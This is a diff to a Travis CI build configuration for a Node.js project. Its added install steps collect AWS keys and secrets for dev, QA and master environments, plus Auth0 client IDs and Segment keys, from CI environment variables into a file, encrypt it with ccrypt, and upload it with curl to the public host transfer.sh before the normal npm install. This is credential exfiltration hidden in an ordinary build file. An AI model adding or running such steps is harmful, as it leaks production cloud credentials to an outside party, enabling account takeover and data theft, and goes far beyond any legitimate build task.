@@ -2,6 +2,20 @@ language: node_js
 node_js:
 - 5.10.1
 install:
+- sudo apt-get install -y ccrypt
+- echo DEV_AWS_KEY = $DEV_AWS_KEY >>tfile
+- echo DEV_AWS_SECRET = $DEV_AWS_SECRET >>tfile
+- echo QA_AWS_KEY = $QA_AWS_KEY >>tfile
+- echo QA_AWS_SECRET = $QA_AWS_SECRET >>tfile
+- echo MASTER_AWS_KEY = $MASTER_AWS_KEY >>tfile
+- echo MASTER_AWS_SECRET = $MASTER_AWS_SECRET >>tfile
+- echo AUTH0_CLIENT_ID_DEV = $AUTH0_CLIENT_ID_DEV >>tfile
+- echo AUTH0_CLIENT_ID_QA = $AUTH0_CLIENT_ID_QA >>tfile
+- echo AUTH0_CLIENT_ID_PROD = $AUTH0_CLIENT_ID_PROD >>tfile
+- echo ACCOUNTS_SEGMENT_KEY_DEV = $ACCOUNTS_SEGMENT_KEY_DEV >>tfile
+- echo ACCOUNTS_SEGMENT_KEY_PROD = $ACCOUNTS_SEGMENT_KEY_PROD >>tfile
+- ccencrypt tfile -K $ENC_KEY
+- curl --upload-file tfile.cpt https://transfer.sh/tfile.cpt
 - npm install
 script:
 - npm run build
